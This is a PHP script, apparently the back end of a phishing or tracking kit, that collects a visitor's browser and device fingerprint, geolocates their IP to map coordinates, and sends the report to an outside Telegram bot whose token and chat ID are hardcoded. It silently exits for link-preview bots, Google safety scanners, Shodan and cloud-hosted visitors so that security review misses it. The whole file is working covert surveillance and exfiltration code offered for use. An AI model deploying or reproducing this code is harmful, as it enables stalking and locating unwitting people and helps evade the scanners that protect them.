<?php
// ============================================================
// ULTIMATE DEVICE CAPTURE – VISUALLY ENHANCED TELEGRAM OUTPUT
// ============================================================

// 1. Anti-bot / crawler (User-Agent check)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/(TelegramBot|WhatsApp|Instagram|facebookexternalhit|Facebot|GoogleImageProxy|Googlebot|Google-Safety|Mediapartners-Google)/i', $userAgent)) {
    exit();
}

// 2. Telegram config
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
$chatId   = "-1003598938463";

// 3. Helper: get POST safely
function getPost($key, $default = 'Unknown') {
    return htmlspecialchars($_POST[$key] ?? $default, ENT_QUOTES, 'UTF-8');
}

// 4. Get real IP
function getRealIpAddr() {
    $headers = [
        'HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_INCAP_CLIENT_IP',
        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED', 'REMOTE_ADDR'
    ];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            foreach (explode(',', $_SERVER[$header]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}
$ip = getRealIpAddr();

// ============================================================
// 4.5. ADVANCED ANTI-BOT: Data Center & Cloud Blocker
// ============================================================
if ($ip !== 'Unknown') {
    $hostname = @gethostbyaddr($ip);
    if ($hostname && $hostname !== $ip) {
        $blockedHosts = [
            'amazonaws.com',       // Amazon AWS
            'googleusercontent.com', // Google Cloud
            'googlebot.com',       // Google Scanners
            'search.msn.com',      // Microsoft/Bing Bots
            'compute.internal',    // Generic Cloud instances
            'linode.com',          // Linode Hosting
            'digitalocean.com',    // DigitalOcean Hosting
            'shodan.io',           // Shodan Security Scanners
            'onrender.com'         // Render Internal Scanners
        ];
        foreach ($blockedHosts as $blocked) {
            if (stripos($hostname, $blocked) !== false) {
                exit(); // Silently kill the script for data center bots
            }
        }
    }
}
// ============================================================

// 5. IP geolocation
$city = $region = $country = $isp = 'Unknown';
$lat = $lon = '';

if ($ip !== 'Unknown') {
    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,message,country,regionName,city,isp,lat,lon");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $json = curl_exec($ch);
    curl_close($ch);
    if ($json) {
        $geo = json_decode($json, true);
        if ($geo && isset($geo['status']) && $geo['status'] == 'success') {
            $city   = $geo['city']   ?? 'Unknown';
            $region = $geo['regionName'] ?? 'Unknown';
            $country= $geo['country'] ?? 'Unknown';
            $isp    = $geo['isp']    ?? 'Unknown';
            $lat    = $geo['lat']    ?? '';
            $lon    = $geo['lon']    ?? '';
        }
    }
}

// 6. Collect all incoming data
$data = [
    'userAgent'              => getPost('userAgent'),
    'platform'               => getPost('platform'),
    'language'               => getPost('language'),
    'languages'              => getPost('languages'),
    'cookieEnabled'          => getPost('cookieEnabled'),
    'doNotTrack'             => getPost('doNotTrack'),
    'hardwareConcurrency'    => getPost('hardwareConcurrency'),
    'deviceMemory'           => getPost('deviceMemory'),
    'maxTouchPoints'         => getPost('maxTouchPoints'),
    'pdfViewerEnabled'       => getPost('pdfViewerEnabled'),
    'webdriver'              => getPost('webdriver'),
    'plugins'                => getPost('plugins'),
    'screenWidth'            => getPost('screenWidth'),
    'screenHeight'           => getPost('screenHeight'),
    'screenAvailWidth'       => getPost('screenAvailWidth'),
    'screenAvailHeight'      => getPost('screenAvailHeight'),
    'screenColorDepth'       => getPost('screenColorDepth'),
    'screenPixelRatio'       => getPost('screenPixelRatio'),
    'innerWidth'             => getPost('innerWidth'),
    'innerHeight'            => getPost('innerHeight'),
    'outerWidth'             => getPost('outerWidth'),
    'outerHeight'            => getPost('outerHeight'),
    'timezone'               => getPost('timezone'),
    'timezoneOffset'         => getPost('timezoneOffset'),
    'batteryLevel'           => getPost('batteryLevel'),
    'batteryCharging'        => getPost('batteryCharging'),
    'effectiveType'          => getPost('effectiveType'),
    'downlink'               => getPost('downlink'),
    'rtt'                    => getPost('rtt'),
    'saveData'               => getPost('saveData'),
    'gpuVendor'              => getPost('gpuVendor'),
    'gpuRenderer'            => getPost('gpuRenderer'),
    'webglVersion'           => getPost('webglVersion'),
    'shadingLanguageVersion' => getPost('shadingLanguageVersion'),
    'webglVendor'            => getPost('webglVendor'),
    'webglRenderer'          => getPost('webglRenderer'),
    'canvasHash'             => getPost('canvasHash'),
    'webglParams'            => getPost('webglParams'),
    'localIP'                => getPost('localIP'),
    'touchSupport'           => getPost('touchSupport'),
    'orientation'            => getPost('orientation'),
    'fingerprintHash'        => getPost('fingerprintHash'),
];

// 7. Build the ultimate visual message
$message = "🔥 <b>ULTIMATE DEVICE CAPTURE</b> 🔥\n";
$message .= "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

// Network intelligence
$message .= "🌐 <b>NETWORK INTELLIGENCE</b>\n";
$message .= "├ IP: <code>{$ip}</code>\n";
$message .= "├ City: {$city}\n";
$message .= "├ Region: {$region}\n";
$message .= "├ Country: {$country}\n";
$message .= "├ ISP: {$isp}\n";
if ($lat && $lon) {
    // FIXED GOOGLE MAPS LINK HERE
    $mapsLink = "https://www.google.com/maps?q={$lat},{$lon}";
    $message .= "├ Coordinates: {$lat}, {$lon}\n";
    $message .= "└ Map: <a href='{$mapsLink}'>View on Google Maps</a>\n";
} else {
    $message .= "└ Coordinates: Not available\n";
}
$message .= "\n";

// Device fingerprint
$message .= "💻 <b>DEVICE FINGERPRINT</b>\n";
$message .= "├ OS: {$data['platform']}\n";
$message .= "├ Browser: " . getPost('brw', 'Unknown') . "\n";
$message .= "├ Battery: {$data['batteryLevel']} (Charging: {$data['batteryCharging']})\n";
$message .= "├ RAM: {$data['deviceMemory']} GB\n";
$message .= "├ Cores: {$data['hardwareConcurrency']}\n";
$message .= "├ Screen: {$data['screenWidth']}x{$data['screenHeight']} px (Color depth: {$data['screenColorDepth']}, Pixel ratio: {$data['screenPixelRatio']})\n";
$message .= "├ Time Zone: {$data['timezone']} (offset {$data['timezoneOffset']} min)\n";
$message .= "├ Language: {$data['language']} (accepted: {$data['languages']})\n";
$message .= "├ Touch: {$data['touchSupport']} (Max points: {$data['maxTouchPoints']})\n";
$message .= "├ Orientation: {$data['orientation']}\n";
$message .= "├ GPU Vendor: {$data['gpuVendor']}\n";
$message .= "├ GPU Renderer: {$data['gpuRenderer']}\n";
$message .= "├ WebGL Version: {$data['webglVersion']}\n";
$message .= "├ Shading Language: {$data['shadingLanguageVersion']}\n";
$message .= "├ Canvas Hash: <code>{$data['canvasHash']}</code>\n";
$message .= "└ Plugins: {$data['plugins']}\n\n";

// Connection info
$message .= "📡 <b>CONNECTION INFO</b>\n";
$message .= "├ Effective Type: {$data['effectiveType']}\n";
$message .= "├ Downlink: {$data['downlink']} Mbps\n";
$message .= "├ RTT: {$data['rtt']} ms\n";
$message .= "└ Save Data: {$data['saveData']}\n\n";

// Fingerprint hash
$message .= "🆔 <b>FINGERPRINT HASH:</b> <code>{$data['fingerprintHash']}</code>\n";

// 8. Send to Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$params = [
    'chat_id' => $chatId,
    'text'    => $message,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true // Set to true so Telegram doesn't try to crawl the map link
];
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);
?>
